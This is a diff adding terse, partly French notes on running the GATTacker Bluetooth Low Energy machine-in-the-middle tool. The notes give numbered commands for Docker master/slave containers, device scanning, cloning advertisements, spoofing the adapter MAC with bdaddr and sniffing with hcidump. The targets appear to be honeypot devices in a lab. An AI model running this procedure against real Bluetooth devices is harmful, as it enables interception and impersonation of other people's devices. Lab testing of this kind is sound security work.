@@ -1,0 +1,48 @@
+GATTACKER:
+(ref: https://www.blackhillsinfosec.com/machine-in-the-middle-mitm-ble-attack/)
+
+	Preparation:
+		
+		hciconfig hci0 up
+		hciconfig hci1 up
+		hciconfig
+		
+		ifconfig wlan1 up
+		iwconfig wlan1 mode monitor
+		iwconfig wlan1
+		ifconfig wlan1
+		
+		- demarrer les deux docker: master et slave avec portainer ou:
+		
+			docker run -d --name master --net=host --privileged -it omicronns/gattacker
+			docker run -d --name slave --net=host --privileged -it omicronns/gattacker
+		
+	Terminal 1: (slave, pret de l'objet ou du service BLE)
+	
+		1) 	docker exec -ti slave bash
+		3) 	cd /gattacker; node ws-slave
+			
+	Terminal 2: (master, pret de l'operateur ou la machine centrale/parent ou le client BLE)
+	
+		2) 	docker exec -ti master bash
+			(vi /gattacker/config.env et avoir ipv4 slave)
+		4) 	cd /gattacker; node scan
+			(fichiers generes par ble decouvert est <MAC_ADVSTRING>.adv.json ex: aaaaaaaaaaaa_HONEYNET-DO-NOT-CONNECT.adv.json)
+		5) 	node scan -o a8:61:0a:34:66:11
+		or 	node scan -o a8:61:0a:34:66:15
+		or 	node scan -o aa:aa:aa:aa:aa:aa
+			(le service ble a interroger et a manipuler, fichier genere est <MAC>.srv.json ex: aaaaaaaaaaaa.srv.json )
+		6)	./mac_adv -a devices/a8610a346611_156-MATTE-HONEY-1.adv.json
+		or	./mac_adv -a devices/0080e126cc9b_HONEY-2.adv.json -s devices/0080e126cc9b.srv.json		
+		or	./mac_adv -a devices/aaaaaaaaaaaa_HONEYNET-DO-NOT-CONNECT.adv.json
+
+	Terminal 3: 
+		7)	bdaddr -i hci0 -r A8:61:0A:48:66:15
+		or	cd ~/bdaddr; ./bdaddr -i hci0 -r aa:aa:aa:aa:aa:aa
+		8)	hciconfig hci0 reset
+		9)	hciconfig hci0
+		10)	hcidump -i hci0
+
+	Terminal 4:
+		11)	hcidump -i hci1
+
